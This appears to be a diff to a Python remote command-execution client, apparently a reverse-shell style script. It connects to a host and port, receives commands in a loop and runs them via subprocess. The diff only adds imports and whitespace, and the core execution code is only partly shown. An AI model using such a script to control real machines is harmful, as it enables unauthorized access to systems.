@@ -2,7 +2,10 @@
 
 # import modules
 import socket
+import os
+import threading
 import subprocess
+
 
 # define remote host and port
 host = '127.0.0.1'
@@ -18,7 +21,7 @@ while True:
     if not comm:
         break
     elif comm == '':
-        pass
+        pass        
     else:
         try:
             # excute command sending the output
